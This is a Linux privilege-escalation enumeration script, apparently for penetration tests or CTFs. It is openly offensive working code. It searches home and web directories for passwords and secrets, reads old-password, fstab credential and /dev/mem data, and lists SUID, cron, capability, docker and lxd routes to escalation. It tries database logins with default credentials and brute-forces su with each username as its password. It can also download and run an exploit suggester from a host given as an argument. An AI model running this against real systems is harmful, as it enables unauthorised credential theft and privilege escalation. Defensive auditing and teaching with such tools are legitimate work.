#!/bin/sh

check_kernel_vuln="no"


echo "#####################################################"
echo "Network Interface configuration"
echo "#####################################################"
echo ""
echo ""

ifconfig | grep "flags\|inet"

echo "#####################################################"
echo "Trying to locate database config file"
echo "#####################################################"
echo ""
echo ""

find /var/www -type f -readable  2> /dev/null -exec egrep -lin "localhost|127.0.0.1" {} \;

echo "#####################################################"
echo "Printing file containing password or secret or passwd"
echo "#####################################################"
echo ""
echo ""

find /home -type f -readable  2> /dev/null -exec  egrep -lin "user|username|login|pass|pwd|password|key|credential|cred|secret" {} \;
find /var/www -type f -readable  2> /dev/null -exec egrep -lin "user|username|login|pass|pwd|password|key|credential|cred|secret" {} \;

for i in user username login pass pwd credential key cred secret note; do find /var/www/ -type f  -name "*$i*" 2>/dev/null ; done

for i in user username login pass pwd credential key cred secret note; do find /home -type f  -name "*$i*" 2>/dev/null ; done


echo ""
echo ""
echo "#####################################################"
echo "Checking .htpasswd file"
echo "#####################################################"
echo ""
echo ""

find / -name ".htpasswd" 2> /dev/null

echo "#####################################################"
echo "Printing PATH from users "
echo "#####################################################"
echo ""
echo ""

find / -maxdepth 3 -name "*profile*" -readable -type f 2> /dev/null | egrep "home|root" | xargs cat | grep "PATH" | grep -v "^#"

echo "#####################################################"
echo "Usefull information about CMS/Web APP"
echo "#####################################################"
echo ""
echo ""

echo "Powered by"
grep -lri "powered by" /var/www 2> /dev/null


echo "Designed by"
grep -lri "designed by" /var/www 2> /dev/null


echo ""
echo ""
echo "#####################################################"
echo "Credentials file in /etc/fstab"
echo "#####################################################"
echo ""
echo ""

grep cred /etc/fstab 2>/dev/null |awk '{sub(/.*\credentials=/,"");sub(/\,.*/,"")}1' 2>/dev/null | xargs -I{} sh -c 'ls -la {}; cat {}' 2>/dev/null

echo ""
echo ""
echo "#####################################################"
echo "Checking readable mail"
echo "#####################################################"
echo ""
echo ""


find /var/mail/ -type f -readable 2> /dev/null

echo ""
echo ""
echo "#####################################################"
echo "Old passwords"
echo "#####################################################"
echo ""
echo ""

cat /etc/security/opasswd 2> /dev/null

echo ""
echo ""
echo "#####################################################"
echo "Last 10 min file edited"
echo "#####################################################"
echo ""
echo ""

find / -mmin -10 ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" -type f -readable 2>/dev/null  | grep -Ev "^/proc"


echo ""
echo "#####################################################"
echo "Processes"
echo "#####################################################"
echo ""
echo ""

for i in $(cat /etc/passwd | grep "sh$" | awk -F ":" '{print $1}'); do echo "##############################"; echo " Process running by $i"; echo "##############################"; ps -aux | grep $i | grep -v "0:00 grep" | awk '$4 > 0.0 {print $0}' ;  echo;   done

echo ""
echo ""
echo "#####################################################"
echo "Others root users"
echo "#####################################################"
echo ""
echo ""

cat /etc/passwd | grep ":0:" | grep -v root

echo ""
echo ""
echo "#####################################################"
echo "Available shells"
echo "#####################################################"
echo ""
echo ""

cat /etc/shells 2> /dev/null

echo ""
echo ""
echo "#####################################################"
echo "Root files"
echo "#####################################################"
echo ""
echo ""

find /root -type f  2> /dev/null 

echo ""
echo ""
echo "#####################################################"
echo "Root readable files"
echo "#####################################################"
echo ""
echo ""

#find /root -type f -readable 2> /dev/null 
find / -user root -type f -readable ! -path "/proc/*" ! -path "/lib/*" ! -path "/boot/*" ! -path "/lib/*"  ! -path "/var/lib/*" ! -path "/bin/*" ! -path "/usr/*" ! -path "/run/*" ! -path "/sys/*" ! -path "/etc/*" ! -path "/sbin/*" ! -path "/var/*" 2> /dev/null


echo ""
echo ""
echo "#####################################################"
echo "Root /var/www files"
echo "#####################################################"
echo ""
echo ""

 
find /var/www -user root -type f 2> /dev/null


echo ""
echo ""
echo "#####################################################"
echo "Root /var/www readable files"
echo "#####################################################"
echo ""
echo ""
 
find /var/www -user root -type f  -readable 2> /dev/null

echo ""
echo ""
echo "#####################################################"
echo "/home files"
echo "#####################################################"
echo ""
echo ""

find /home -type f 2> /dev/null 

echo ""
echo ""
echo "#####################################################"
echo "/home readable files"
echo "#####################################################"
echo ""
echo ""

find /home -type f -readable 2> /dev/null 


echo ""
echo ""
echo "#####################################################"
echo "Others than (home and root) files readable"
echo "#####################################################"
echo ""
echo ""

find /  -type f -readable ! -path "/proc/*" ! -path "/root/*" ! -path "/home/*" ! -path "/lib/*" ! -path "/boot/*" ! -path "/lib/*"  ! -path "/var/lib/*" ! -path "/bin/*" ! -path "/usr/*" ! -path "/run/*" ! -path "/sys/*" ! -path "/etc/*" ! -path "/sbin/*" ! -path "/var/*" 2> /dev/null

echo "If /usr/ is writable, we can update the uname (startup program) of mod in called in /etc/update-motd.d/10-uname or edit any logon script found with psspy"

echo ""
echo ""
echo "#####################################################"
echo "Others than (home and root) files and directories writable"
echo "#####################################################"
echo ""
echo ""

find / -writable ! -path "/proc/*" !  -path "/tmp/*" ! -path "/root/*" ! -path "/home/*" ! -path "/lib/*" ! -path "/dev/*" ! -path "/boot/*" ! -path "/lib/*"  ! -path "/var/lib/*" ! -path "/run/*" ! -path "/sys/*" ! -path "/etc/*"  ! -path "/var/*" 2> /dev/null


echo ""
echo ""
echo "#####################################################"
echo "In memory passwords"
echo "#####################################################"
echo ""
echo ""

strings /dev/mem -n10  2> /dev/null| grep -i PASS

echo ""
echo ""
echo "#####################################################"
echo "Writable files"
echo "#####################################################"
echo ""
echo ""

echo "In /etc/"
echo ""
echo ""

find /etc/ -writable -type f 2> /dev/null

echo ""
echo ""
echo "In others directories"
echo ""
echo ""

find / -writable ! -user $(whoami) -type f ! -path "/proc/*"  ! -path "/etc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null


#echo ""
#echo ""
#echo "#####################################################"
#echo "Writable file not by current user"
#echo "#####################################################"
#echo ""
#echo ""

#find / -writable ! -user $(whoami) -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null

echo ""
echo ""
echo "#####################################################"
echo "Checking hash in /etc/passwd"
echo "#####################################################"
echo ""
echo ""

awk -F ":" 'length($2) > 2 {print $0}' /etc/passwd | sort -u 

echo ""
echo ""
echo "#####################################################"
echo "Non root process"
echo "#####################################################"
echo ""
echo ""

ps -eo comm | sort | uniq | xargs which |   xargs -n1 ls -l | grep -v root

echo ""
echo ""
echo "#####################################################"
echo "cron job readable"
echo "#####################################################"
echo ""
echo ""


find -L /etc/cron* /etc/anacron* /var/spool/cron -readable -type f 2> /dev/null

echo ""
echo "Non default crontab content"
echo ""

cat /etc/crontab | grep -v "^#" | grep -iv "^SHELL" | grep -iv "^PATH" | grep -v "/etc/cron.hourly" | grep -v "/etc/cron.daily" | grep -v "/etc/cron.weekly" | grep -v "/etc/cron.monthly"

echo ""
echo "Crontab list for current user"
echo ""

crontab -l

echo ""
echo ""
echo "#####################################################"
echo "cron job writable"
echo "#####################################################"
echo ""
echo ""

find -L /etc/cron* /etc/anacron* /var/spool/cron -writable 2> /dev/null

echo ""
echo ""
echo "#####################################################"
echo "Sudo (List of suid program is stored in suid_program.txt more find https://gtfobins.github.io/"
echo "#####################################################"
echo ""
echo ""


sudo -l

#echo "apt apt-get aria2c arp ash awk base64 bash busybox cancel cat chmod chown cp cpan cpulimit crontab csh curl cut dash date dd diff dmesg dmsetup dnf docker dpkg easy_install ed emacs env expand expect facter file find finger flock fmt fold ftp gawk gdb gimp git grep head iftop ionice ip irb jjs journalctl jq jrunscript ksh ldconfig ld.so less logsave ltrace lua mail make man mawk more mount mtr mv mysql nano nawk nc nice nl nmap node od openssl perl pg php pic pico pip puppet python readelf red rlogin rlwrap rpm rpmquery rsync ruby run-mailcap run-parts rvim scp screen script sed service setarch sftp shuf smbclient socat sort sqlite3 ssh start-stop-daemon stdbuf strace systemctl tail tar taskset tclsh tcpdump tee telnet tftp time timeout tmux ul unexpand uniq unshare vi vim watch wget whois wish xargs xxd yum zip zsh zypper" > /tmp/sudo_list.txt

echo ""
echo ""
echo "#####################################################"
echo "Checking vulnerable program"
echo "#####################################################"
echo ""
echo ""

find / -name chkrootkit 2> /dev/null
dpkg -l | awk '{print $2}' | sort -u | grep exim 2> /dev/null
#whereis exim4; /usr/sbin/exim4 --version | head -1

echo ""
echo ""
echo "#####################################################"
echo "System Timer"
echo "#####################################################"
echo ""
echo ""

type -a time
systemctl list-timers --all


echo ""
echo ""
echo "#####################################################"
echo "Uncommon SUID"
echo "#####################################################"
echo ""
echo ""

echo "/bin/fusermount
/bin/mount
/bin/ntfs-3g
/bin/ping
/bin/ping6
/bin/su
/bin/umount
/lib64/dbus-1/dbus-daemon-launch-helper
/sbin/mount.ecryptfs_private
/sbin/mount.nfs
/sbin/pam_timestamp_check
/sbin/pccardctl
/sbin/unix2_chkpwd
/sbin/unix_chkpwd
/usr/bin/Xorg
/usr/bin/arping
/usr/bin/at
/usr/bin/beep
/usr/bin/chage
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/expiry
/usr/bin/firejail
/usr/bin/fusermount
/usr/bin/fusermount-glusterfs
/usr/bin/gpasswd
/usr/bin/kismet_capture
/usr/bin/mount
/usr/bin/mtr
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/procmail
/usr/bin/staprun
/usr/bin/su
/usr/bin/sudo
/usr/bin/sudoedit
/usr/bin/traceroute6.iputils
/usr/bin/umount
/usr/bin/weston-launch
/usr/lib/chromium-browser/chrome-sandbox
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/dbus-1/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/pt_chown
/usr/lib/snapd/snap-confine
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/xorg/Xorg.wrap
/usr/libexec/Xorg.wrap
/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/gstreamer-1.0/gst-ptp-helper
/usr/libexec/openssh/ssh-keysign
/usr/libexec/polkit-1/polkit-agent-helper-1
/usr/libexec/pt_chown
/usr/libexec/qemu-bridge-helper
/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/grub2-set-bootflag
/usr/sbin/mount.nfs
/usr/sbin/mtr-packet
/usr/sbin/pam_timestamp_check
/usr/sbin/pppd
/usr/sbin/pppoe-wrapper
/usr/sbin/suexec
/usr/sbin/unix_chkpwd
/usr/sbin/userhelper
/usr/sbin/usernetctl
/usr/sbin/uuidd
/usr/bin/mlocate
/usr/bin/bsd-write
/usr/bin/ssh-agent
/usr/bin/wall
/usr/bin/dotlockfile" > /tmp/common_suid


#find / -perm -4000 -type f 2>/dev/null > /tmp/uncommon_suid_file

find / -perm /u=s -type f 2>/dev/null > /tmp/uncommon_suid_file

echo ""
echo "SUID files"
echo ""

for i in  $(cat /tmp/uncommon_suid_file)
do 
        if ! $(grep -Fxq $i /tmp/common_suid) ; then
                echo $i
        fi
done

echo ""
echo "GUID files"
echo ""

find / -perm /g=s -type f 2>/dev/null > /tmp/uncommon_suid_file

for i in  $(cat /tmp/uncommon_suid_file)
do 
        if ! $(grep -Fxq $i /tmp/common_suid) ; then
                echo $i
        fi
done


echo ""
echo "Don't forget LDD of PRELOAD"

rm /tmp/uncommon_suid_file
rm /tmp/common_suid

echo ""
echo ""
echo "#####################################################"
echo "Find LD_PRELOAD"
echo "#####################################################"
echo ""
echo ""

cat /etc/sudoers | grep -i "LD_PRELOAD "

echo ""
echo ""
echo "#####################################################"
echo "Capabilities: Look for cap_dac_read_search or ep"
echo "#####################################################"
echo ""
echo ""

getcap -r / 2> /dev/null

echo ""
echo ""
echo "#####################################################"
echo "Checking no_root_squash in /etc/exports"
echo "#####################################################"
echo ""
echo ""

cat /etc/exports | grep -i "no_root_squash"

echo ""
echo ""
echo "#####################################################"
echo "Checking docker user"
echo "#####################################################"
echo ""
echo ""

cat /etc/passwd | grep docker

cat /etc/group | grep -v ":$" | grep docker

echo ""
echo ""
echo "#####################################################"
echo "Checking lxd user"
echo "#####################################################"
echo ""
echo ""

cat /etc/passwd | grep "lxc\|lxd"
cat /etc/group | grep -v ":$" | grep "lxc\|lxd"

echo ""
echo ""
echo "#####################################################"
echo "Checking Mysql with root and no pass credential"
echo "#####################################################"
echo ""
echo ""

mysqladmin -uroot version

echo ""
echo ""
echo "#####################################################"
echo "Checking Mysql with root/root and no pass credential"
echo "#####################################################"
echo ""
echo ""

mysqladmin -uroot -proot version

echo ""
echo ""
echo "#####################################################"
echo "Checking PostgreSql template0 as postgres and no pass"
echo "#####################################################"
echo ""
echo ""

psql -U postgres template0 -c "select version()" | grep version

echo ""
echo ""
echo "#####################################################"
echo "Checking PostgreSql template1 as postgres and no pass"
echo "#####################################################"
echo ""
echo ""

psql -U postgres template1 -c "select version()" | grep version

echo ""
echo ""
echo "#####################################################"
echo "Checking PostgreSql  template0 as psql and no pass"
echo "#####################################################"
echo ""
echo ""

psql -U pgsql template0 -c "select version()" | grep version

echo ""
echo ""
echo "#####################################################"
echo "Checking PostgreSql template1 as psql and no pass"
echo "#####################################################"
echo ""
echo ""

psql -U pgsql template1 -c "select version()" | grep version

echo ""
echo ""
echo "#####################################################"
echo "Checking if Mysql is running as root user"
echo "#####################################################"
echo ""
echo ""

find / -path "/etc/mysql*" -name "*.cnf"  -type f -readable  2> /dev/null | xargs cat | grep -v "^#" | grep root

echo ""
echo ""
echo "#####################################################"
echo "Echo user with shell"
echo "#####################################################"
echo ""
echo ""

grep -E "sh$" /etc/passwd

echo "Don't forget to put them in password list"

echo ""
echo ""
echo "#####################################################"
echo "User with password set as username"
echo "#####################################################"
echo ""
echo ""

for i in $(cat /etc/passwd |grep "sh$" | cut -d: -f1 )
do
cat << EOFN > /tmp/expect.sh
#!/usr/bin/expect -f
set timeout 5
spawn su - $i -c id
expect "Password: " {send "$i\r"}
expect eof
EOFN
chmod +x /tmp/expect.sh && /tmp/./expect.sh | grep -vi "password\|spawn\|Authentication"
done

rm /tmp/expect.sh

echo ""
echo ""
echo "#####################################################"
echo "Echo user with multiples groups"
echo "#####################################################"
echo ""
echo ""

cat /etc/group | grep -v  ":$" | awk -F ":" '{print $4}'   | tr "," "\n" | sort -u > /tmp/multiples_groups
grep -f /tmp/multiples_groups /etc/passwd | grep "sh$" | awk -F ":" '{print $1 }' > /tmp/multiples_groups_users
for i in $(cat /tmp/multiples_groups_users); do groups $i; done
rm /tmp/multiples_groups*


echo ""
echo ""
echo "#####################################################"
echo "Check if root permitted to login via ssh"
echo "#####################################################"
echo ""
echo ""

grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#"

echo ""
echo ""
echo "#####################################################"
echo "Last log user"
echo "#####################################################"
echo ""
echo ""

lastlog 2>/dev/null |grep -v "Never" 2>/dev/null

echo ""
echo ""
echo "#####################################################"
echo "Listening connexion"
echo "#####################################################"
echo ""
echo ""

if [[ $(which netstat) ]]; then netstat -antep | grep -i listen; else ss -tulnp; fi


echo ""
echo ""
echo "#####################################################"
echo "Listening connexion short"
echo "#####################################################"
echo ""
echo ""

if [[ $(which netstat) ]]; then netstat -antep | grep -i listen | grep "127.0.0.1" ; else ss -tulnp | grep "127.0.0.1"; fi

echo ""
echo ""
echo "#####################################################"
echo "Established connexion"
echo "#####################################################"
echo ""
echo ""

if [[ $(which netstat) ]]; then netstat -antep | grep -i established; else ss -tuenp; fi


echo ""
echo ""
echo "#####################################################"
echo "Echo system info"
echo "#####################################################"
echo ""
echo ""

lse_arch="`uname -m`"
lse_linux="`uname -r`"
lse_hostname="`hostname`"
lse_distro=`command -v lsb_release >/dev/null 2>&1 && lsb_release -d | sed 's/Description:\s*//' 2>/dev/null`
[ -z "$lse_distro" ] && lse_distro="`(source /etc/os-release && echo "$PRETTY_NAME")2>/dev/null`"

echo "Architecture $lse_arch"
echo "Linux $lse_linux"
echo "Distibution $lse_distro"
echo "Hostname $lse_hostname"

echo ""
echo ""
echo "#####################################################"
echo "Listing installed compilers"
echo "#####################################################"
echo ""
echo ""


dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null

echo "Try linux suggester if nothing found"

echo "Activating ls in detail mode"

alias ls="ls -la"

if [ $check_kernel_vuln = "yes" ]
	then
		wget $1/linux-exploit-suggester.sh
		chmod +x linux-exploit-suggester.sh
		./linux-exploit-suggester.sh
fi